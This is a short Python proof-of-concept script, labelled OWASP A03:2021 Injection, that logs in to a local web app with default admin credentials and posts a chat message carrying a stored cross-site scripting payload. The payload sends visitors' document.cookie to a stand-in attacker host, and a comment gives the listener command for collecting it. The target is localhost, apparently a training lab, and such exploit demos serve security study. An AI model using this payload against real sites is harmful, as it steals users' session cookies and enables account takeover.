#OWASP A03:2021 - Injection

import requests

s = requests.Session()
s.post("http://localhost:5000/login", data={"username": "admin", "password": "admin123"})
s.post("http://localhost:5000/chat/1", data={"message": "<script>fetch('http://attacker.tld/coletar?cookie=' + document.cookie);</script>"})

# Listener from hacker:
#sudo python3 -m http.server 80


